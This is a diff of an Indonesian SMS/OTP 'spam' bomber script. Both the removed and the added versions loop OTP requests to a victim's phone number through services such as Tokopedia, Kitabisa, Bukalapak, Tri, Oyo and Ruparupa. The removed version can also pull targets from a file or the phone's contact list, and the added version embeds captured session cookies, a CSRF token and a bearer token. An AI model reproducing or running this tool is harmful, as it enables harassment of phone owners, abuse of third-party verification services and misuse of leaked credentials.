@@ -1,303 +1,234 @@
-#!/usr/bin/python
-import requests,random,json,time,sys,os,re
-# -----------------------------------------------------------
-# Tidak ada author Untuk Sc ini kecuali ./Kitsune yg Telah Mendesign Dengan Sempurna
-# Update 26 january 2020 21:57
-# Recode!, dosa Tanggung Sendiri
-# Thanks For MyFriends, FourX, MhankBarBar, Maulana, Rexy
-# Underground Science And Termux Tutorial Group
-# ---------------------------------------------------------------
+#!/usr/bin/python2
+# coding=utf-8
+import requests as r
+import sys,os,time,random,json
 
-# -----------------------WARNA----------------------------
-p = '\x1b[0m'
-m = '\x1b[91m'
-h = '\x1b[92m'
-k = '\x1b[93m'
-b = '\x1b[94m'
-u = '\x1b[95m'
-bm = '\x1b[96m'
-bgm = '\x1b[41m'
-bgp = '\x1b[47m'
-res = '\x1b[40m'
-# -------------------------------------------------------
-# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
-#------------------------Classes------------------------
-class spam:
-		
-	def __init__(self, nomer):
-		self.nomer = nomer
-		
-	def spam(self):
-		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
-		if hasil.status_code == 200:
-			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
-		elif hasil.status_code == 500:
-			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
-			
-	def tokped(self):
-		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
-		kirim = {
-			'User-Agent' : rands,
-			'Accept-Encoding' : 'gzip, deflate',
-			'Connection' : 'keep-alive',
-			'Origin' : 'https://accounts.tokopedia.com',
-			'Accept' : 'application/json, text/javascript, */*; q=0.01',
-			'X-Requested-With' : 'XMLHttpRequest',
-			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
-		}
-		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
-		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
-		formulir = {
-			"otp_type" : "116",
-			"msisdn" : self.nomer,
-			"tk" : Token,
-			"email" : '',
-			"original_param" : "",
-			"user_id" : "",
-			"signature" : "",
-			"number_otp_digit" : "6"
-		}
-		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
-		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
-			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
-		else:
-			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
+G = '\x1b[0;32m'
+GL = '\x1b[32;1m'
+B = '\x1b[0;36m'
+P = '\x1b[35;1m'
+BL = '\x1b[36;1m'
+BD = '\x1b[34;1m'
+R = '\x1b[31;1m'
+W = '\x1b[37;1m'
+H = '\x1b[30;1m'
+Y = '\x1b[33;1m'
+YL = '\x1b[1;33m'
 
-	def phd(self):
-		param = {'phone_number':self.nomer}
-		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
-		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
-			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
-		else:
-			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
-			
-	def balaji(self):
-		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
-		kod="62"
-		ata={
-				"country_code":kod,
-				"phone_number":self.nomer
-			}
-		head={
-			"Content-Length":f"{len(str(ata))}",
-			"Accept":"application/json, text/plain, */*",
-			"Origin":"https://lite.altbalaji.com",
-			"Save-Data":"on",
-			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
-			"Content-Type":"application/json;charset=UTF-8",
-			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
-			"Accept-Encoding":"gzip, deflate, br",
-			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
-			}
-		req=requests.post(urlb,data=json.dumps(ata),headers=head)
-		if '{"status":"ok"}' in req.text:
-			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
-		else:
-			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Fail!'
-	def TokoTalk(self):
-		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
-		head={
-			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
-			"content-type":"application/json;charset=UTF-8"
-		}
-		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
-		else:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
-# ------------------------------------------------------------
 
-# ---------------------------Fungsi----------------------------
-def apakah():
-	while True:
-		lan=str(input(k+'\tWant more? y/n : '+h))
-		if( lan == 'y' or lan == 'Y'):
-			jnspam()
-		elif(lan == 'n' or lan == 'N'):
-			print(p)
-			break
-		else:
-			continue
-def files():
-	fil=str(input(k+'\tFile : '+h))
-	if fil in os.listdir(os.getcwd()):
-		l=open(fil,'r').readlines()
-		js=int(input(k+'\tTotal spam : '+h))
-		dly=int(input(k+'\tDelay : '+h))
-		for pp in range(js):
-			for d in range(len(l)-1):
-				io=l[d].split('\n')[0]
-				z=spam(io)
-				if jns == 'ktbs':
-					print('\t'+z.spam())
-				elif jns == 'tkpd':
-					print('\t'+z.tokped())
-				elif jns == 'blji':
-					print('\t'+z.balaji())
-				elif jns == 'smua':
-					print('\t'+z.spam())
-					print('\t'+z.tokped())
-					print('\t'+z.balaji())
-					print('\t'+z.phd())
-					print('\t'+z.TokoTalk())
-				elif jns == 'pehd':
-					print('\t'+z.phd())
-				elif jns == 'ttk':
-					print('\t'+z.TokoTalk())
-				else:
-					print()
-				time.sleep(dly)
-		apakah()
+logo = '''{}
+ _____ _____ _____ _____ _____ _____ 
+|   __|  _  |  _  |     |   __| __  |
+|__   |   __|     | | | |   __|    -|
+|_____|__|  |__|__|_|_|_|_____|__|__|
+                                     
+{}Author : {}sCuby07
+{}Team   : {}Cyber Ghost Indonesia
+'''.format(R,W,BL,W,GL)
+
+
+def oyo():
+    m = 0
+    n = 0
+    no = raw_input("{}Nomer Target : {}".format(GL,W))
+    ju = int(raw_input("{}Jumlah Spam : {}".format(GL,W)))
+    dl = raw_input("{}Delay : {}".format(GL,W))
+    print BL + '═' *35
+    p = {
+	'Host': 'masterkadal.com',
+	'accept': 'application/json, text/plain, */*',
+	'save-data': 'on',
+	'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
+	'referer': 'https://masterkadal.com/tools/oyo/'
+    }
+    for z in range(ju):
+	v = r.get('https://masterkadal.com/api/oyo/?nomer=895611982226',headers = p).json()
+	if "SMS berhasil dikirim." in v["msg"]:
+		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
+                time.sleep(int(dl))
+                m -=- 1
 	else:
-		print(m+f'\tFile {fil} doesn`t exist')
-def single():
-	nomer=str(input(k+'\tPhone number : '+h))
-	jm=int(input(k+'\tTotal spam : '+h))
-	dly=int(input(k+'\tDelay : '+h))
-	for oo in range(jm):
-		z=spam(nomer)
-		if jns == 'ktbs':
-			print('\t'+z.spam())
-		elif jns == 'tkpd':
-			print('\t'+z.tokped())
-		elif jns == 'blji':
-			print('\t'+z.balaji())
-		elif jns == 'smua':
-			print('\t'+z.spam())
-			print('\t'+z.tokped())
-			print('\t'+z.balaji())
-			print('\t'+z.phd())
-			print('\t'+z.TokoTalk())
-		elif jns == 'pehd':
-			print('\t'+z.phd())
-		elif jns == 'ttk':
-			print('\t'+z.TokoTalk())
-		else:
-			print()
-		time.sleep(dly)
-	apakah()
-def multi():
-	nomer=[]
-	jum=int(input(k+'\tTotal number : '+h))
-	for i in range(jum):
-		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
-	spm=int(input(k+'\tTotal spam : '+h))
-	dly=int(input(k+'Delay : '+h))
-	kk=len(nomer)
-	for i in range(spm):
-		for ss in range(kk):
-			z=spam(nomer[ss])
-			if jns == 'ktbs':
-				print('\t'+z.spam())
-			elif jns == 'tkpd':
-				print('\t'+z.tokped())
-			elif jns == 'blji':
-				print('\t'+z.balaji())
-			elif jns == 'smua':
-				print('\t'+z.spam())
-				print('\t'+z.tokped())
-				print('\t'+z.balaji())
-				print('\t'+z.phd())
-				print('\t'+z.TokoTalk())
-			elif jns == 'pehd':
-				print('\t'+z.phd())
-			elif jns == 'ttk':
-				print('\t'+z.TokoTalk())
-			else:
-				print()
-		time.sleep(dly)
-	apakah()
-#-------------------------Fungsi Banner-----------------------
-def logo():
-	os.system('clear')
-	auth=m+'  Author : '+k+'./kitsune'
-	# jika ingin m3namambah kan variabel dan mengubah data variabel kitsune bisa menambahkan %s menambahkan variabel terus di ubah menjjadu string, %d = mengubah data menjadi decimal , %i = mengubah data menjadi integer
-	return '''
-%s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s╔═╗╔═╗╔═╗╔╦╗
-%s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s╚═╗╠═╝╠═╣║║║
-%s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s╚═╝╩  ╩ ╩╩ ╩
-%s╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣%s╲%s╔═╗╔╦╗╔═╗
-%s╲┃┈┈┈┈┈┈┈┈┈┈▉▉▉%s╲%s╚═╗║║║╚═╗
-%s╲┃┈┈┈┈┈┈┈┈┈┈◥▉◤%s╲%s╚═╝╩ ╩╚═╝
-%s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗
-%s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
-%s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩  
-%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)
-# -----------------------------------------------------------
-def termux():
-	os.system('termux-contact-list > .contact')
-	po=json.loads(open('.contact','r').read())
-	lenpo=len(po)
-	for poh in range(lenpo):
-		print(m+str(poh+1)+' '+k+po[poh]['name'])
-	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
-	dly=int(input(u+'\tDelay > '+h))
-	for w in range(int(input(u+'\tTotal spam : '+h))):
-		z=spam(nj)
-		if jns == 'ktbs':
-			print('\t'+z.spam())
-		elif jns == 'tkpd':
-			print('\t'+z.tokped())
-		elif jns == 'blji':
-			print('\t'+z.balaji())
-		elif jns == 'smua':
-			print('\t'+z.spam())
-			print('\t'+z.tokped())
-			print('\t'+z.balaji())
-			print('\t'+z.phd())
-			print('\t'+z.TokoTalk())
-		elif jns == 'pehd':
-			print('\t'+z.phd())
-		elif jns == 'ttk':
-			print('\t'+z.TokoTalk())
-		time.sleep(dly)
-	apakah()
-def main():
-	print(logo())
-	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODE '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Back\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Single Number\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'Multi Number\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'Load number from file\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Select number from contact\n'+b+'╠══════════════════════════════')
-	pil=str(input(b+'╚══'+m+'〙'+u+'Mode'+m+' ▶ '+h))
-	if( pil == '1' or pil == '01'):
-		single()
-	elif( pil == '2' or pil == '02'):
-		multi()
-	elif( pil == '3' or pil == '03'):
-		files()
-	elif( pil == '4' or pil == '04'):
-		termux()
-	elif( pil == '0' or pil == '00'):
-		jnspam()
-	else:
-		print(m+'             Don`t leave it blank')
-		time.sleep(2)
+		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
+                time.sleep(int(dl))
+                n -=- 1
+    print BL + '═' *35
+    print '\x1b[37;1mSUCCES : ' + GL + str(m) + W + " FAILED : " + R + str(n)
+    print BL + '═' *35 + W
+
+def buka():
+   h = 0
+   j = 0
+   no = raw_input("{}Nomer Target : {}".format(GL,W))
+   ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
+   dl = raw_input("{}Delay : {}".format(GL,W))
+   print BL + '═' *35
+   data = {
+    'feature':'phone_registration',
+    'feature_tag':'',
+    'manual_phone':no,
+    'channel':'SMS',
+    'is reskin':'true',
+    'device_fingerprint':'80fc69a69fa4cccea0d9271b9b5377c5'
+   }
+   head = {
+    'Host': 'm.bukalapak.com',
+    'content-length': '145',
+    'x-newrelic-id': 'VQcDWF9ADgIJVVBQ',
+    'origin': 'https://m.bukalapak.com',
+    'x-csrf-token': 'HDakj5+4Xo28K7A3+M55Kjbm7qi97dpl6hNLWO++sbcqhi+ZG1oTY3UKPG5aleoxQHbVqMG34pjpYqg+xr8EJA==',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'accept': '*/*',
+    'x-requested-with': 'XMLHttpRequest',
+    'save-data': 'on',
+    'referer': 'https://m.bukalapak.com/register?from=home_mobile',
+    'Cookie':'identity=ba1c134224b94c846a4705d5d6f7130f;browser_id=06b3da643e9f103550a4453009a84c06;_ga=GA1.2.1433061458.1580684400;_gcl_au=1.1.2126925204.1580684401;_vwo_uuid_v2=DB9AF867CDE7D270F61D0F15745875CAD|a4c172803aedbab18226481c257c7d2c;_fbp=fb.1.1580684416409.2061456332;kppid_managed=NNAcyoMd;__auc=8a22edbf1701f355368e9b9f9ba;_gid=GA1.2.2067220299.1581071558;_gcl_aw=GCL.1581071591.Cj0KCQiAsvTxBRDkARIsAH4W_j-FUKnevJNggDQ-ZAT4XH-nhWz0fQh71MANIdd2SZI_zJmlAuIoUmUaAm07EALw_wcB;cto_bundle=RwRG519Dcmh5RXJERHIlMkI3VGt6cXFsYThvTWhReDB5T3hyV3ZpTE5QNGZkSnRQems5TiUyRnVCU285cXBFWWhsciUyQjJWeU9kZ3lXQmNsYkVGSCUyQjlTeTF2YzlyTUFlRDMlMkIzTU9QSHlPeElXTWl4QW1OSnE2UGRzd0dmNjNSS3hyWiUyRllvM2oyJTJGc0V2RDdXbzdGeEk1YXliemNEOTdFUSUzRCUzRA;auth.strategy=bukalapak;session_id=402d729bb97626f211bf5c7d637729f4;_gac_UA-12425854-1=1.1581127745.Cj0KCQiAsvTxBRDkARIsAH4W_j_lN4U5eL9bP13RykksHAeJZPAMQ7rFnCrTKnNiyffi8cfQv5XXCLgaAp4eEALw_wcB;__cfduid=d58540a60f2ee01293d04f50c154cbbde1581127746;__session:0.2651600709732702:=https:;_gat=1;_td=52ec4eba-a2dd-4554-ac6f-c3e1ec780b1e;_mkra_ctxt=69ab7e5e4830453599ccf10a7db959e7--200;lskjfewjrh34ghj23brjh234=K1dRajhKQlZvZFVPdTdqRkppMnQ5ZjRKejVHeHVReXJTamRFZUlqM2F2Wk1YVThHaSsrZVV4V0pncThFRVBtTlNORHJOamM1b1FubG1pVGhob2Q2akg1QndUQmlPMnJWM0YxVjBSOGxPVW91WGJzUjJCR3IyS0lXMFFKcXNzbzkrUy9MeUtQdFZTMUxHb084ZUk3ZWx2MWMvS3NZUFdKWjRoSUhNQmc4ZHVMb1dZdGZKbDNIMGMrZnFwQmQxekpSLS1EenY2MDRQdVRlek1vYmJGL21XVUxRPT0%3D--a8822f3b786f54f169504da49433f550b1c9284a'
+   }
+   for k in range(int(ju)):
+	 f = r.post('https://m.bukalapak.com/trusted_devices/otp_request', headers = head, data = data).json()
+	 if "failed" in f["status"]:
+		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
+		time.sleep(int(dl))
+		h -=- 1
+ 	 else:
+		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
+                time.sleep(int(dl))
+                j -=- 1
+   print BL + '═' *35
+   print '\x1b[37;1mSUCCES : ' + GL + str(h) + W + " FAILED : " + R + str(j)
+   print BL + '═' *35 + W
+
+def tri():
+   try:
+   	no = raw_input("{}Nomer Target : {}".format(GL,W))
+   	hit = len(no)
+   	if hit < 10:
+		print "Masukan Nomer!"
+		time.sleep(3)
 		main()
-def jnspam():
-	global jns
-	print(logo())
-	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Unlimited)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Without +62 or 0)\n'+b+'╠══════════════════════════════')
-	while True:
-		oy=str(input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h))
-		if( oy == '1' or oy == '01' ):
-			jns='smua'
-			break
-		elif( oy == '2' or oy == '02' ):
-			jns='pehd'
-			break
-		elif( oy == '3' or oy == '03' ):
-			jns='ktbs'
-			break
-		elif( oy == '4' or oy == '04' ):
-			jns='tkpd'
-			break
-		elif( oy == '5' or oy == '05' ):
-			jns='ttk'
-			break
-		elif( oy == '6' or oy == '06' ):
-			jns='blji'
-			break
-		elif( oy == '0' or oy == '00' ):
-			sys.exit()
+  	ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
+   	dl = raw_input("{}Delay : {}".format(GL,W))
+   	print BL + '═' *35
+   	data = {
+    	  "msisdn":no,
+    	  "imei":"WebSelfcare"
+   	}
+   	head = {
+	    "Host": "www.bima.tri.co.id",
+	    "Connection": "keep-alive",
+	    "Content-Length": "47",
+	    "Accept": "application/json, text/plain, */*",
+	    "Origin": "https://www.bima.tri.co.id",
+	    "Authorization": "Bearer",
+	    "Save-Data": "on",
+	    "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
+	    "Content-Type": "application/json",
+	    "Referer": "https://www.bima.tri.co.id/login"
+ 	}
+   	e = 0
+	o = 0
+   	for t in range(int(ju)):
+		d = r.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = data).text
+		if '200' in str(d):
+			print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
+			time.sleep(int(dl))
+			e -=- 1
 		else:
-			print(m+'             Don`t leave it blank')
-			continue
-	main()
+			print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
+                	time.sleep(int(dl))
+                	o -=- 1
+	print BL + '═' *35
+	print '\x1b[37;1mSUCCES : ' + GL + str(e) + W + " FAILED : " + R + str(o)
+	print BL + '═' *35 + W
+   except KeyboardInterrupt:
+		sys.exit
+
+
+def main():
+    os.system('clear')
+    print logo + '\n'
+    print BL + '═' *35 + W + '\n      1. Oyo Hotel\n      2. Ruparupa\n      3. Spam Tri\n      4. Bukalapak\n' + BL +'═'*35
+    oi = raw_input("{}Spam > ".format(W))
+    print BL + '═' *35
+    if oi == "1":
+	oyo()
+    elif oi == "2":
+	rprp()
+    elif oi == "3":
+	tri()
+    elif oi == "4":
+	buka()
+
+def rprp():
+   no = raw_input("{}Nomer Target : {}".format(GL,W))
+   ju = raw_input("{}Jumlah Spam : {}".format(GL,W))
+   dl = raw_input("{}Delay : {}".format(GL,W))
+   print 'Limit : 10'
+   print BL + '═' *35
+   headers_1 = {
+			
+	'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
+	'Accept' : 'application/json',
+	'Origin' : 'https://m.ruparupa.com',
+	'Referer' : 'https://m.ruparupa.com/my-account',
+	'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
+	'x-company-name' : 'odi'
+			
+   }
+			
+   data_1 = {
+			
+	'phone' : no,
+	'email' : 'jejak@gmail.com',
+	'action' : 'register',
+	'password' : ''
+			
+   }
+			
+   headers_2 = {
+			
+	'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
+	'x-company-name' : 'odi', 
+	'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
+	'Origin' : 'https://m.ruparupa.com',
+	'referer' : 'https://m.ruparupa.com/verification?page=otp-choices',
+	'accept-encoding' : 'gzip, deflate, br' 
+			
+   }
+			
+   data_2 = {
+			
+	'phone' : no,
+	'action' : 'register',
+	'channel' : 'chat',
+	'email' : '',
+	'customer_id' : '0',
+	'is_resend' : 0
+			
+   }
+			
+   url_1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
+   url_2 = 'https://wapi.ruparupa.com/auth/generate-otp'
+	
+   z = 0
+   r = 0
+   for a in range(int(ju)):
+	sending_1 = r.post(url_1, headers = headers_1, data = data_1)
+        sending_2 = r.post(url_2, headers = headers_2, data = data_2)
+
+        if 'tunggu 1x24 jam' in sending_2.text:
+		print '{}{} {}[{}FAIL{}] [{}×{}]'.format(W,no,W,R,W,R,W)
+		time.sleep(int(dl))
+		z -=- 1
+	else:
+		print '{}{} {}[{}SEND{}] [{}✓{}]'.format(W,no,W,GL,W,GL,W)
+		time.sleep(int(dl))
+                r -=- 1
+   print BL + '═' *35
+   print '\x1b[37;1mSUCCES : ' + GL + str(z) + W + " FAILED : " + R + str(r)
+   print BL + '═' *35 + W
+
+
+
 if __name__ == '__main__':
-	jnspam()
+	main()
